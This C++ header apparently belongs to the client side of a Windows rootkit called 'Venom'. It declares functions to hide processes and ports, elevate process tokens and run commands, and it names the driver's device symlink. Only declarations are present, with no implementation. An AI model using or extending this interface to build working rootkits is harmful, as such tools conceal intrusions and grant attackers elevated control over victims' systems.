#pragma once
#include <Windows.h>
#include <iostream>
#include <string>

namespace VenomCommands {

	bool hideProcess(ULONG pid);
	bool hidePort(USHORT port);
	bool elevateToken(ULONG pid);
	bool executeCommand(const char* command, const char* output);

	enum CommandTypes
	{
		HideProcess = 1,
		HidePort = 2,
		ElevateToken = 3,
		ExecuteCommand = 4
	};

	struct Command
	{
		int size = 0;
		int commandType = 0;
		char* data;
	};

	constexpr int commandOutputBufferLength = 2048;

	constexpr const wchar_t* VenomSymLink = L"\\\\.\\VenomRootkit";
}